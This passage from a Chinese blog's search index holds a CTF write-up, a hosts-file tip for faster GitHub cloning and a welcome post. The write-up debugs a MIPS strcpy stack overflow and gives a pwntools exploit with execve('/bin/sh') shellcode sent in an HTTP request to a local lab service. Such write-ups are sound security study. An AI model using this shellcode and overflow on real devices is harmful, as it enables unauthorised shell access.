0x7fff6bd8  0x00400c9c  jalr    $t9 ; strcpy                # 这条指令将执行strcpy0x00400CC4  0x7fff6bd8  0x00400cc8  nop0x00400CC8  0x7fff6bd8  0x00400cc8  lw      $gp, 0x138+var_128($fp)     # strcpy后第一条指令----------0x00400D7C  0x7fff6bd8  0x00400d70  lw      $ra, 0x138+var_4($sp)       # 这里修改了$ra, 我们溢出到栈上覆盖了这个地址后, $ra的值是我们伪造的地址0x00400D80  0x7fff6bd8  0x00400e68  lw      $fp, 0x138+var_8($sp)       # 这里伪造的$ra=0x7fff6b5a0x00400D84  0x7fff6bd8  0x00400e68  addiu   $sp, 0x138                  # $ra=0x7fff6b5a0x00400D88  0x7fff6d10  0x00400e68  jr      $ra                         # 跳转回main</code></pre><p>直接修改$ra 跳过去就可以, 修改$ra为0x7fff6b5a</p><p>测试完以后发现, 会报</p><pre><code>Program received signal SIGBUS, Bus error.GDB is unable to find the start of the function at 0x7fff6b5aand thus can&apos;t determine the size of that function&apos;s stack frame.This means that GDB may be unable to access that stack frame, orthe frames below it.This problem is most likely caused by an invalid program counter orstack pointer.However, if you think GDB should simply search farther backfrom 0x7fff6b5a for code which looks like the beginning of afunction, you can increase the range of the search using the `setheuristic-fence-post&apos; command.0x7fff6b5a in ?? ()</code></pre><p>猜测可能是MIPS需要对齐地址, $sp = 0x7fff6bd8, 所以应该按4字节增长, 设置$ra = $sp + 4 * n</p><p>但是实际运行环境的$sp不知道, 得想办法解决一哈</p><p>调试环境测试跳转到shellcode可以稳定getshell</p><p><img src="/2019/01/19/训练赛记录/7.png" alt="img"></p><p>0x04 exp</p><p>先给出exp…等我想办法找到栈地址再补充</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">shellcode  = <span class="string">"\x28\x06\xff\xff"</span>      <span class="comment">#  /* slti    a2,zero,-1   */</span></span><br><span class="line">shellcode += <span class="string">"\x3c\x0f\x2f\x2f"</span>      <span class="comment">#  /* lui     t7,0x2f2f    */</span></span><br><span class="line">shellcode += <span class="string">"\x35\xef\x62\x69"</span>      <span class="comment">#  /* ori     t7,t7,0x6269 */</span></span><br><span class="line">shellcode += <span class="string">"\xaf\xaf\xff\xf4"</span>      <span class="comment">#  /* sw      t7,-12(sp)   */</span></span><br><span class="line">shellcode += <span class="string">"\x3c\x0e\x6e\x2f"</span>      <span class="comment">#  /* lui     t6,0x6e2f    */</span></span><br><span class="line">shellcode += <span class="string">"\x35\xce\x73\x68"</span>      <span class="comment">#  /* ori     t6,t6,0x7368 */</span></span><br><span class="line">shellcode += <span class="string">"\xaf\xae\xff\xf8"</span>      <span class="comment">#  /* sw      t6,-8(sp)    */</span></span><br><span class="line">shellcode += <span class="string">"\xaf\xa0\xff\xfc"</span>      <span class="comment">#  /* sw      zero,-4(sp)  */</span></span><br><span class="line">shellcode += <span class="string">"\x27\xa4\xff\xf4"</span>      <span class="comment">#  /* addiu   a0,sp,-12    */</span></span><br><span class="line">shellcode += <span class="string">"\x28\x05\xff\xff"</span>      <span class="comment">#  /* slti    a1,zero,-1   */</span></span><br><span class="line">shellcode += <span class="string">"\x24\x02\x0f\xab"</span>      <span class="comment">#  /* li      v0,4011      */</span></span><br><span class="line">shellcode += <span class="string">"\x01\x01\x01\x0c"</span>      <span class="comment">#  /* syscall 0x40404      */</span></span><br><span class="line"></span><br><span class="line">shellcode_addr = <span class="string">''</span></span><br><span class="line">shellcode_addr = <span class="string">"\x7f\xff\x6b\x50"</span>  <span class="comment">#  shellcode的地址</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/a'</span> + shellcode + <span class="string">'a'</span> * (<span class="number">253</span> - len(shellcode) - <span class="number">5</span>) + <span class="string">'/123'</span> + shellcode_addr</span><br><span class="line"></span><br><span class="line">http = <span class="string">'GET '</span> + payload + <span class="string">' HTTP/1.1'</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'127.0.0.1'</span>, <span class="number">1234</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">'r'</span>) <span class="comment"># gdb run</span></span><br><span class="line">r.recv()        <span class="comment"># start?</span></span><br><span class="line">r.send(<span class="string">'\n'</span>)</span><br><span class="line">r.sendline(http)</span><br><span class="line">r.recv()</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>题目本身简单..保护全关, 但是麻烦的地方就是调试环境, 一开始用qemu共享库起, 报段错误, 无法运行</p><p>m4x师傅给了我一个docker: <a href="https://github.com/Inv0k3r/multiarch-docker">multiarch-docker</a></p><p>能运行了但是一调试就炸…最后没办法了才直接在虚拟机里跑, 装个gdb然后端口映射233</p><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><p>程序很简单, 对输入的64字节进行计算然后输出结果</p><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  const char *v3; <span class="comment">// rdi</span></span><br><span class="line">  __int128 v5; <span class="comment">// [rsp+0h] [rbp-48h]</span></span><br><span class="line">  __int128 v6; <span class="comment">// [rsp+10h] [rbp-38h]</span></span><br><span class="line">  __int128 v7; <span class="comment">// [rsp+20h] [rbp-28h]</span></span><br><span class="line">  __int128 v8; <span class="comment">// [rsp+30h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="number">0</span>LL;</span><br><span class="line">  v6 = <span class="number">0</span>LL;</span><br><span class="line">  v7 = <span class="number">0</span>LL;</span><br><span class="line">  v8 = <span class="number">0</span>LL;</span><br><span class="line">  fgets((char *)&amp;v5, <span class="number">64</span>, stdin);</span><br><span class="line">  v3 = <span class="string">"Correct"</span>;</span><br><span class="line">  if ( <span class="number">3115122397540209627</span>LL * (_QWORD)v5 != <span class="number">-8945977187951441533</span>LL</span><br><span class="line">    &amp;&amp; <span class="number">4414703129018815665</span>LL * *((_QWORD *)&amp;v5 + <span class="number">1</span>) != <span class="number">4916877443135797676</span>LL</span><br><span class="line">    &amp;&amp; <span class="number">-3600163150705005919</span>LL * (_QWORD)v6 != <span class="number">7810089588917861348</span>LL</span><br><span class="line">    &amp;&amp; <span class="number">2848986016212807631</span>LL * *((_QWORD *)&amp;v6 + <span class="number">1</span>) != <span class="number">167648691539577515</span>LL</span><br><span class="line">    &amp;&amp; <span class="number">-1642960843930225163</span>LL * (_QWORD)v7 != <span class="number">7205007458378757539</span>LL</span><br><span class="line">    &amp;&amp; <span class="number">-1825322870425963839</span>LL * *((_QWORD *)&amp;v7 + <span class="number">1</span>) != <span class="number">-4377928447117523719</span>LL</span><br><span class="line">    &amp;&amp; <span class="number">2026288208431064569</span>LL * (_QWORD)v8 != <span class="number">1464929445109676135</span>LL</span><br><span class="line">    &amp;&amp; <span class="number">7391496157776266721</span>LL * *((_QWORD *)&amp;v8 + <span class="number">1</span>) != <span class="number">-2449767388115536590</span>LL )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="string">"Wrong"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  puts(v3);</span><br><span class="line">  return <span class="number">0</span>LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>v5-8都是int128类型, 占用128 / 8 = 16字节, qword是8个字节</p><p>4个变量共64字节构成key, 然后每个变量又分别分成8个字节去计算</p><pre><code>3115122397540209627LL * (_QWORD)v5 != -8945977187951441533LL4414703129018815665LL * *((_QWORD *)&amp;v5 + 1) != 4916877443135797676LL-3600163150705005919LL * (_QWORD)v6 != 7810089588917861348LL2848986016212807631LL * *((_QWORD *)&amp;v6 + 1) != 167648691539577515LL-1642960843930225163LL * (_QWORD)v7 != 7205007458378757539LL-1825322870425963839LL * *((_QWORD *)&amp;v7 + 1) != -4377928447117523719LL2026288208431064569LL * (_QWORD)v8 != 1464929445109676135LL7391496157776266721LL * *((_QWORD *)&amp;v8 + 1) != -2449767388115536590LL</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
            <tag> mips </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何提高Git Clone的速度</title>
      <link href="/2019/01/18/%E5%A6%82%E4%BD%95%E6%8F%90%E9%AB%98git-clone%E7%9A%84%E9%80%9F%E5%BA%A6/"/>
      <url>/2019/01/18/%E5%A6%82%E4%BD%95%E6%8F%90%E9%AB%98git-clone%E7%9A%84%E9%80%9F%E5%BA%A6/</url>
      
        <content type="html"><![CDATA[<ol><li><p>用ssh</p></li><li><p>改host</p></li></ol><p>Linux下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mv /etc/host /etc/host_bak \</span><br><span class="line">vim /etc/host</span><br></pre></td></tr></table></figure><p>下面这些丢进去<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"># <span class="selector-tag">Github</span></span><br><span class="line">151<span class="selector-class">.101</span><span class="selector-class">.44</span><span class="selector-class">.249</span> <span class="selector-tag">github</span><span class="selector-class">.global</span><span class="selector-class">.ssl</span><span class="selector-class">.fastly</span><span class="selector-class">.net</span></span><br><span class="line">192<span class="selector-class">.30</span><span class="selector-class">.253</span><span class="selector-class">.113</span> <span class="selector-tag">github</span><span class="selector-class">.com</span></span><br><span class="line"># <span class="selector-tag">The</span> <span class="selector-tag">follow</span> 3 <span class="selector-tag">line</span> <span class="selector-tag">may</span> <span class="selector-tag">cause</span> <span class="selector-tag">Github</span> <span class="selector-tag">access</span> <span class="selector-tag">slowly</span></span><br><span class="line"># 103<span class="selector-class">.245</span><span class="selector-class">.222</span><span class="selector-class">.133</span> <span class="selector-tag">assets-cdn</span><span class="selector-class">.github</span><span class="selector-class">.com</span></span><br><span class="line"># 23<span class="selector-class">.235</span><span class="selector-class">.47</span><span class="selector-class">.133</span> <span class="selector-tag">assets-cdn</span><span class="selector-class">.github</span><span class="selector-class">.com</span></span><br><span class="line"># 203<span class="selector-class">.208</span><span class="selector-class">.39</span><span class="selector-class">.104</span> <span class="selector-tag">assets-cdn</span><span class="selector-class">.github</span><span class="selector-class">.com</span></span><br><span class="line"># <span class="selector-tag">-------------------------------------------</span></span><br><span class="line">204<span class="selector-class">.232</span><span class="selector-class">.175</span><span class="selector-class">.78</span> <span class="selector-tag">documentcloud</span><span class="selector-class">.github</span><span class="selector-class">.com</span></span><br><span class="line">204<span class="selector-class">.232</span><span class="selector-class">.175</span><span class="selector-class">.94</span> <span class="selector-tag">gist</span><span class="selector-class">.github</span><span class="selector-class">.com</span></span><br><span class="line">107<span class="selector-class">.21</span><span class="selector-class">.116</span><span class="selector-class">.220</span> <span class="selector-tag">help</span><span class="selector-class">.github</span><span class="selector-class">.com</span></span><br><span class="line">207<span class="selector-class">.97</span><span class="selector-class">.227</span><span class="selector-class">.252</span> <span class="selector-tag">nodeload</span><span class="selector-class">.github</span><span class="selector-class">.com</span></span><br><span class="line">199<span class="selector-class">.27</span><span class="selector-class">.76</span><span class="selector-class">.130</span> <span class="selector-tag">raw</span><span class="selector-class">.github</span><span class="selector-class">.com</span></span><br><span class="line">107<span class="selector-class">.22</span><span class="selector-class">.3</span><span class="selector-class">.110</span> <span class="selector-tag">status</span><span class="selector-class">.github</span><span class="selector-class">.com</span></span><br><span class="line">204<span class="selector-class">.232</span><span class="selector-class">.175</span><span class="selector-class">.78</span> <span class="selector-tag">training</span><span class="selector-class">.github</span><span class="selector-class">.com</span></span><br><span class="line">207<span class="selector-class">.97</span><span class="selector-class">.227</span><span class="selector-class">.243</span> <span class="selector-tag">www</span><span class="selector-class">.github</span><span class="selector-class">.com</span></span><br><span class="line">185<span class="selector-class">.31</span><span class="selector-class">.16</span><span class="selector-class">.184</span> <span class="selector-tag">github</span><span class="selector-class">.global</span><span class="selector-class">.ssl</span><span class="selector-class">.fastly</span><span class="selector-class">.net</span></span><br><span class="line">185<span class="selector-class">.31</span><span class="selector-class">.18</span><span class="selector-class">.133</span> <span class="selector-tag">avatars0</span><span class="selector-class">.githubusercontent</span><span class="selector-class">.com</span></span><br><span class="line">185<span class="selector-class">.31</span><span class="selector-class">.19</span><span class="selector-class">.133</span> <span class="selector-tag">avatars1</span><span class="selector-class">.githubusercontent</span><span class="selector-class">.com</span></span><br></pre></td></tr></table></figure></p><p>然后<br><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/etc/i</span>nit.d<span class="regexp">/networking restart</span></span><br></pre></td></tr></table></figure></p><p>ok，速度拉满</p>]]></content>
      
      
      
        <tags>
            
            <tag> github </tag>
            
            <tag> 优化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2019/01/15/hello-world/"/>
      <url>/2019/01/15/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to my blog!</p><h1 id="修修改改博客终于搞起来了"><a href="#修修改改博客终于搞起来了" class="headerlink" title="修修改改博客终于搞起来了"></a>修修改改博客终于搞起来了</h1><p>从WordPress到hexo再到github+hexo</p><p>然后换了三五个主题</p><p>最终决定用这个仙人掌, 非常合我口味</p><p>同时也安利一下 <a href="https://probberechts.github.io/hexo-theme-cactus/">https://probberechts.github.io/hexo-theme-cactus/</a></p><p>404页面的小恐龙用的是这个 <a href="https://github.com/wayou/t-rex-runner">https://github.com/wayou/t-rex-runner</a></p><p>有时间准备给about me写个好看的js</p><p>然后emmmmmmmmmmmm</p><p>想试试把NES.css结合进来, 八像素风格真好看233</p>]]></content>
      
      
      
        <tags>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
